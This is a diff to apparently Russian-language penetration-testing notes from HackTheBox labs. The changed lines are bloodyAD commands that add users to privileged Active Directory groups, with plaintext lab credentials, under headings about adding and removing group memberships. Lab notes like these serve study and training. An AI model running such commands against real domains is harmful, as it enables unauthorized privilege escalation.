@@ -110,8 +110,8 @@ sudo bloodhound
 
 # Добавление в группу
  
-  bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"
-
+        bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"
+        bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add groupMember ITADMINS pedro
 # Удалление группы из группы
 
     Попробуем удалить эту группу IT из группы PROTECTED OBJECTS:
